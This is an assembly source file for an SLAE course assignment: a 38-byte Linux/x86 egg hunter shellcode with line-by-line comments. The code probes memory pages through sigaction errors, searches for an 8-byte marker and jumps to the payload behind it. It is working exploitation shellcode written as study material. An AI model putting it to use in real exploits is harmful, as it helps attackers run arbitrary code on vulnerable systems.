; SLAE - Assignment #3: Egg Hunter (Linux/x86) - 38 bytes
; Author:  Matteo Malvica (@matteomalvica)
; Website:  www.matteomalvica.com
; Least used instructions https://www.strchr.com/x86_machine_code_statistics
; egg used = AAA+AAS (0x373F) x2, which is very uncommon

global _start			

section .text
_start:
	cld 				; clear direction flag in preparation for scasd 
	xor edx,edx			; clear edx
	xor ecx,ecx			; clear ecx
align_page:
    or cx,0xfff         ; page alignment at 4095 - avoid explicit 4096 nullbyte
next_address:
    inc ecx				; bring it at 4096 - default linux page size
    push byte +0x43     ; sigaction(2) value
    pop eax             ; store syscall identifier in eax
    int 0x80            ; call sigaction(2)
    cmp al,0xf2         ; check if we got an EFAULT(f2) 
    jz align_page       ; if so, it's an invalid pointer, loop back and try with next page
    mov eax, 0x373F373F ; if valid page, place the egg in eax
    mov edi, ecx        ; address to be validated, moved into edi
    scasd               ; compare eax / edi and increment edi by 4 bytes
    jnz next_address    ; if no match - try with the next address
    scasd               ; first 4 bytes matched, what about the other half?
    jnz next_address    ; no match - try with the next address
    jmp edi             ; egg found! jump to our payload
